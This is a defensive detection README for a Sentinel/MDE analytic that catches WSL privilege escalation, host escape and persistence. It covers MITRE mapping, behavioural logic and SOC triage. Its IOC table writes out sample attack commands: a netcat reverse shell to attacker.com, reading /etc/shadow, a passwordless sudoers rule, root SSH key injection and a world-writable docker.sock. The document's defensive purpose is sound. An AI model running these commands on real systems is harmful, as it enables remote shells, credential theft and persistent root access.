# WSL Privilege Escalation & Persistence Detection  
Author: Ala Dabat  
Category: Privilege Escalation / Persistence / Host Escape  
Platform: MDE / Microsoft Sentinel  
Version: Engineering Pack – Behavioural Detection Model

This README provides a full analysis of WSL-based threat behaviour, including the detection matrix, MITRE mapping, IOC catalogue, behavioural logic definitions, kill-chain implications, and SOC triage guidance.  
This module is designed to accompany the WSL Priv Esc & Persistence KQL analytic rule.

---

# 1. Introduction

Windows Subsystem for Linux (WSL) introduces a hybrid execution layer where Linux binaries, filesystems, and privilege models operate inside Windows. This creates an expanded attack surface that adversaries use for:

- Privilege escalation via root-level shells  
- Abuse of WSL to escape the Linux boundary and modify Windows host paths  
- Execution of reverse shells and network utilities  
- Manipulation of critical security files such as /etc/shadow and /etc/sudoers  
- Persistence through SSH keys or custom Linux scripts  
- Abusing docker.sock to escalate privileges to full host compromise  
- Launching malicious WSL sessions from high-risk parents such as mshta, rundll32, wscript, regsvr32  

This README codifies how WSL abuse is detected through behaviour, not signatures.

---
~~~
+-----------------------------+------------+---------------------------------------------------------------+
| MITRE Technique | ID | Detection Surface |
+-----------------------------+------------+---------------------------------------------------------------+
| WSL Command Execution | T1059.004 | Suspicious WSL invocations (wsl.exe, bash.exe, wslhost.exe) |
| Command-Line Interaction | T1059 | Root flags, dangerous system options |
| Linux Privilege Escalation | T1548 | /etc/shadow, /etc/sudoers modification |
| Credential Access | T1003 | Access to Linux authentication databases |
| Container Escape | T1611 | Host mount abuse (/mnt/c/Windows etc.) |
| Persistence via SSH | T1098.004 | Modification of authorized_keys under root |
| Misuse of Docker Socket | T1611.001 | Writes to /var/run/docker.sock |
| Reverse Shell Execution | T1105 | nc/python/curl execution patterns |
| Masquerading / LOLBin Use | T1036 | mshta/wscript/rundll32 launching WSL |
+-----------------------------+------------+---------------------------------------------------------------+
~~~

---

# 3. Threat Detection Matrix (Coverage Overview)

~~~

+-----------------------------------------------------------+----------+--------------------------------------------------------------+
| Threat Category | Detected | Notes |
+-----------------------------------------------------------+----------+--------------------------------------------------------------+
| WSL launched with root flags (--system, -u root) | YES | High-risk flag detection |
| WSL launched by LOLBins | YES | Parent process validation |
| Reverse shells executed inside WSL | YES | Regex for nc/curl/wget/python exec chains |
| Host escape via --mount /mnt/c/Windows | YES | Host boundary crossing patterns |
| Access to /etc/shadow or /etc/sudoers | YES | Critical path monitoring |
| SSH persistence (/root/.ssh/authorized_keys) | YES | SSH persistence detection |
| docker.sock abuse | YES | Maps to container escape |
| Dangerous 777/666 file permission changes | YES | AdditionalFields inspection |
| Interactive WSL usage | NO | Excluded to reduce false positives |
| Benign developer usage | NO | Score threshold blocks noise |
| WSL malware without dangerous flags | NO | Behaviour incomplete |
+-----------------------------------------------------------+----------+--------------------------------------------------------------+

~~~


---

# 4. Behavioural Logic Model

The detection logic is derived from three independent behavioural surfaces:

## 4.1 Suspicious WSL Execution  
A WSL binary is considered suspicious when its command-line contains any of the following patterns:

- Root or system elevation flags  
- Access to sensitive Linux credentials  
- Reverse shell parameters  
- Mount operations involving Windows host paths  
- High-risk parents such as mshta.exe or rundll32.exe  

This reflects known post-exploitation behaviours where adversaries attempt to:

- Escape sandboxing  
- Escalate to root  
- Execute payloads in a Linux environment undetected  
- Interact with the underlying host filesystem  

## 4.2 Critical Security File Modification  
Direct writes, permission changes, or creation of:

- /etc/shadow  
- /etc/sudoers  
- /root/.ssh/authorized_keys  
- /var/run/docker.sock  

These actions align with privilege escalation, persistence, and container escape techniques.

## 4.3 Scoring and Kill Chain Classification  
Actions are mapped to:

- Privilege Escalation  
- Credential Access  
- Container Escape  
- Persistence  
- Execution  

The classification assists SOC analysts in determining exploit phase and required response urgency.

---

# 5. IOC Catalogue

~~~

+---------------------------+--------------------------------------------------------------+
| IOC Type | Example |
+---------------------------+--------------------------------------------------------------+
| Dangerous Root Flag | wsl.exe --system |
| Host Escape Attempt | wsl.exe --mount /mnt/c/Windows/System32 |
| Reverse Shell | bash -c "nc attacker.com 4444 -e /bin/bash" |
| Credential File Access | bash -c "cat /etc/shadow" |
| Sudoers Modification | echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers |
| SSH Persistence | echo "ssh-rsa AAA..." >> /root/.ssh/authorized_keys |
| Docker Abuse | chmod 777 /var/run/docker.sock |
| LOLBin Parent Invocation | mshta.exe launching wsl.exe |
+---------------------------+--------------------------------------------------------------+
~~~

---

# 6. Kill Chain Alignment

~~~
+---------------------------+--------------------------+----------------------------------------------+
| Kill Chain Stage | Behaviour | Detection |
+---------------------------+--------------------------+----------------------------------------------+
| Initial Access | LOLBins launching WSL | Parent-child correlation |
| Execution | Reverse shells | Network exec pattern detection |
| Privilege Escalation | Root flags, shadow edit | Critical path monitoring |
| Persistence | SSH key additions | Authorized_keys detection |
| Defense Evasion | WSL boundary use | SuspiciousExec scoring |
| Credential Access | Reading /etc/shadow | File perms and path tracking |
| Lateral Movement | Docker abuse | docker.sock detection |
| Impact / Host Compromise | Full host escape | Mount path rules |
+---------------------------+--------------------------+----------------------------------------------+
~~~

---

# 7. Analyst Workflow and Triage Guidance

When a detection occurs:

## Step 1 – Validate the Parent Process  
- Was the WSL command initiated by a normal shell or a high-risk parent such as mshta.exe?  
- Unexpected parent → higher probability of exploitation.

## Step 2 – Inspect Command Line  
- Presence of root flags or attempts to interact with /etc/shadow or /etc/sudoers indicates escalation.  
- Reverse shell parameters indicate immediate post-exploitation activity.

## Step 3 – Review File Events  
- Permission escalations on shadow/sudoers files are rarely legitimate.  
- docker.sock modifications imply container escape or lateral movement into infrastructure services.

## Step 4 – Determine Intent  
- Persistence through SSH keys  
- Credential harvesting  
- Escape into Windows paths  
- Privilege escalation attempts

## Step 5 – Identify Blast Radius  
- Query for similar command-lines across fleet  
- Determine whether automated scripts or malware families were deployed  
- Validate identity and authentication logs for associated accounts

## Step 6 – Response Actions  
- Isolate affected host  
- Reset credentials  
- Block WSL execution pending investigation if necessary  
- Review scheduled tasks or persistence artifacts  
- Validate Docker and container runtime integrity  

---

# 8. Notes for Detection Engineering

- Root-level Linux operations inside WSL must be treated as high-risk unless explicitly allowed.  
- Cross-boundary access to Windows directories represents a known container escape vector.  
- Permission changes to critical files map directly to escalation and persistence.  
- High-risk parent processes invoking WSL are a common signature of loader chains and fileless malware.  
- Triage should incorporate identity logs, network logs, and application logs in Sentinel for full context.

---

# End of README


# 2. MITRE ATT&CK Mapping

